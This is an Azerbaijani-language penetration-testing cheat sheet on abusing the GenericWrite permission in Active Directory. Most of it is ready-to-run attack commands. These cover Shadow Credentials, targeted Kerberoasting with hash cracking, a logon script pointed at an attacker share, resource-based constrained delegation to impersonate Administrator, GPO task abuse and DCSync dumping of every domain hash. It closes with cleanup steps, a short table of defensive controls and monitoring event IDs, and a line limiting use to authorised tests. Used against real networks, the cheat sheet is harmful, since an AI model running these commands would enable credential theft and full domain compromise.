# 🔐 Active Directory — GenericWrite ACL Cheat Sheet

> **GenericWrite** hüququ — bir istifadəçiyə AD obyektinin **yazıla bilən bütün atributlarını dəyişdirməyə** icazə verir.  
> WriteOwner-dən fərqli olaraq, sahibi dəyişdirməyə ehtiyac yoxdur — birbaşa atributları manipulyasiya etmək mümkündür.

---

## 📌 Enumeration (Axtarış)

### Bütün GenericWrite hüquqlarını tapmaq
```powershell
Get-DomainObjectAcl | Where-Object {$_.ActiveDirectoryRights -eq "GenericWrite"} |
  Select-Object @{Name="PrincipalName"; Expression={Convert-SidToName $_.SecurityIdentifier}},
                @{Name="ObjectSid"; Expression={Convert-SidToName $_.ObjectSid}},
                ActiveDirectoryRights -Unique
```

### Konkret obyektdə GenericWrite axtarmaq
```powershell
Get-DomainObjectAcl -Identity "jkimmich" |
  Where-Object {$_.ActiveDirectoryRights -match "GenericWrite"} |
  Select-Object @{Name="PrincipalName"; Expression={Convert-SidToName $_.SecurityIdentifier}},
                ActiveDirectoryRights -Unique
```

### Konkret istifadəçinin hansı obyektlər üzərində GenericWrite-a sahib olduğunu tapmaq
```powershell
$sid = Convert-NameToSid "attacker_user"
Get-DomainObjectAcl | Where-Object {
    $_.ActiveDirectoryRights -match "GenericWrite" -and
    $_.SecurityIdentifier -eq $sid
} | Select-Object ObjectDN, ActiveDirectoryRights
```

### BloodHound ilə
```
BloodHound → Node Search → attacker_user → Outbound Object Control → GenericWrite
```

---

## ⚔️ İstismar — Hədəfə görə

---

### 👤 Hədəf: İstifadəçi (User Object)

#### A) Shadow Credentials (Ən effektiv üsul)
`msDS-KeyCredentialLink` atributunu dəyişdirərək sertifikat əsaslı autentifikasiya əldə etmək:
```powershell
# Whisker ilə
Whisker.exe add /target:jkimmich

# Nəticə: Rubeus üçün komanda çıxacaq
Rubeus.exe asktgt /user:jkimmich /certificate:<base64> /password:<pass> /domain:domain.local /ptt

# TGT-dən NTLM hash almaq
Rubeus.exe asktgt ... /getcredentials
```

#### B) Targeted Kerberoasting
`servicePrincipalName` atributunu əlavə edib Kerberoast etmək:
```powershell
# SPN əlavə et
Set-DomainObject -Identity "jkimmich" -Set @{servicePrincipalName="fake/spn"}

# Kerberoast et
Get-DomainSPNTicket -Identity "jkimmich" | Export-Csv hash.csv

# Hash-i crack et
hashcat -m 13100 hash.csv /usr/share/wordlists/rockyou.txt

# Sonra SPN-i sil (cleanup)
Set-DomainObject -Identity "jkimmich" -Clear servicePrincipalName
```

#### C) Scriptpath / Logon Script dəyişdirmək
```powershell
# İstifadəçinin login skriptini dəyişdir
Set-DomainObject -Identity "jkimmich" -Set @{scriptpath="\\attacker\share\evil.ps1"}
```

---

### 🖥️ Hədəf: Kompüter (Computer Object)

#### Resource-Based Constrained Delegation (RBCD)
```powershell
# Fake kompüter hesabı yarat (MachineAccountQuota > 0 lazımdır)
New-MachineAccount -MachineAccount "FakePC" `
                   -Password (ConvertTo-SecureString "P@ss123!" -AsPlainText -Force)

# FakePC-nin SID-ini al
$fakeSID = Get-DomainComputer "FakePC" -Properties objectsid | Select -Expand objectsid

# Hədəf kompüterin msDS-AllowedToActOnBehalfOfOtherIdentity atributunu dəyiş
$SD = New-Object Security.AccessControl.RawSecurityDescriptor `
      -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$fakeSID)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

Set-DomainObject -Identity "TARGETPC$" `
                 -Set @{'msds-allowedtoactonbehalfofotheridentity' = $SDBytes}

# FakePC-nin hash-ini al
Rubeus.exe hash /password:P@ss123! /user:FakePC$ /domain:domain.local

# S4U2Self + S4U2Proxy ilə Administrator ticket al
Rubeus.exe s4u /user:FakePC$ /rc4:<NTLM_HASH> `
              /impersonateuser:Administrator `
              /msdsspn:cifs/TARGETPC.domain.local /ptt

# İcra
ls \\TARGETPC.domain.local\C$
```

#### Shadow Credentials (Kompüter üçün)
```powershell
Whisker.exe add /target:TARGETPC$
Rubeus.exe asktgt /user:TARGETPC$ /certificate:<base64> /password:<pass> /ptt
```

---

### 🏢 Hədəf: Qrup (Group Object)

#### Özünüzü qrupa əlavə etmək
```powershell
# GenericWrite → member atributunu dəyişdir
Add-DomainGroupMember -Identity "IT Admins" -Members "attacker_user"

# Yoxlamaq
Get-DomainGroupMember -Identity "IT Admins"
```

---

### 📜 Hədəf: GPO (Group Policy Object)

```powershell
# GPO-nun atributlarını dəyişdirmək
# SharpGPOAbuse ilə immediate task əlavə etmək
SharpGPOAbuse.exe --AddComputerTask `
                  --TaskName "Update" `
                  --Author "NT AUTHORITY\SYSTEM" `
                  --Command "cmd.exe" `
                  --Arguments "/c net localgroup administrators attacker_user /add" `
                  --GPOName "Default Domain Policy"

# GPO yeniləmə (hücumu tetiklemek)
gpupdate /force
```

---

### 🔑 Hədəf: Domain Object (DCSync)

```powershell
# Domain obyektinə GenericWrite varsa DS-Replication hüququ əlavə et
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" `
                    -PrincipalIdentity "attacker_user" `
                    -Rights DCSync

# Mimikatz ilə
lsadump::dcsync /domain:domain.local /user:krbtgt
lsadump::dcsync /domain:domain.local /all /csv

# Impacket ilə (Linux)
secretsdump.py domain.local/attacker_user:password@DC_IP
```

---

## 🔄 Tam Attack Chain

```
GenericWrite hüququ
    │
    ├──► User hedefi
    │       ├── Shadow Credentials → TGT → NTLM hash
    │       ├── SPN əlavə et → Kerberoast → Crack
    │       └── Logon Script → Code Execution
    │
    ├──► Computer hedefi
    │       ├── RBCD → S4U2Proxy → Admin Impersonation
    │       └── Shadow Credentials → Kompüter hesabı ele keç
    │
    ├──► Group hedefi
    │       └── member dəyiş → Privileged Group-a gir
    │
    ├──► GPO hedefi
    │       └── Task/Script əlavə et → RCE/Persistence
    │
    └──► Domain hedefi
            └── DCSync hüququ əlavə et → Bütün hash-lər
```

---

## 🧹 Cleanup

```powershell
# SPN-i sil
Set-DomainObject -Identity "jkimmich" -Clear servicePrincipalName

# RBCD-ni sil
Set-DomainObject -Identity "TARGETPC$" -Clear msds-allowedtoactonbehalfofotheridentity

# Qrupdan çıxmaq
Remove-DomainGroupMember -Identity "IT Admins" -Members "attacker_user"

# Shadow Credential-i sil
Whisker.exe remove /target:jkimmich /deviceid:<GUID>

# DCSync hüququnu geri al
Remove-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" `
                       -PrincipalIdentity "attacker_user" `
                       -Rights DCSync
```

---

## 🛡️ Müdafiə (Defense)

| Kontrol | Açıqlama |
|--------|----------|
| **msDS-KeyCredentialLink monitoring** | Shadow Credential hücumlarını aşkarlamaq |
| **SPN dəyişikliklərini izləmək** | Targeted Kerberoasting üçün |
| **RBCD atributlarını izləmək** | `msDS-AllowedToActOnBehalfOfOtherIdentity` dəyişiklikləri |
| **MachineAccountQuota = 0** | Fake kompüter yaratmağın qarşısını almaq |
| **Protected Users Group** | Delegation-dan qorunmaq |
| **Credential Guard** | NTLM hash-ların əldə edilməsinin qarşısını almaq |
| **Tiered Admin Model** | GenericWrite-ın yayılmasını məhdudlaşdırmaq |

### Monitorinq üçün Event ID-lər
```
5136 → AD atributunun dəyişdirilməsi (SPN, member, RBCD, KeyCredential)
4769 → Kerberos service ticket tələbi (Kerberoasting)
4662 → AD obyektinə giriş
4741 → Yeni kompüter hesabı yaradılması (fake machine account)
```

---

## 🔧 İstifadə Olunan Alətlər

| Alət | Funksiya |
|------|----------|
| `PowerView` | Enumeration, atribut dəyişikliyi |
| `BloodHound` | Attack path görselleştirme |
| `Whisker` | Shadow Credentials (`msDS-KeyCredentialLink`) |
| `Rubeus` | Kerberoasting, TGT, S4U |
| `SharpGPOAbuse` | GPO manipulation |
| `Impacket` | Linux-dan DCSync, S4U |
| `Mimikatz` | DCSync, pass-the-hash |
| `StandIn` | RBCD, SPN manipulyasiyası |

---

## ⚖️ GenericWrite vs WriteOwner — Müqayisə

| Xüsusiyyət | GenericWrite | WriteOwner |
|-----------|-------------|------------|
| Sahibi dəyişdirmək | ❌ | ✅ |
| Atributları dəyişdirmək | ✅ | ❌ (WriteDACL sonra) |
| Addım sayı | Az (birbaşa) | Çox (chain lazım) |
| Shadow Credentials | ✅ | ✅ (WriteDACL sonra) |
| RBCD | ✅ | ✅ (WriteDACL sonra) |
| Kerberoasting | ✅ | ✅ (WriteDACL sonra) |

---

*Cheat sheet yalnız izinli pentest mühitlərində istifadə üçün nəzərdə tutulub.*
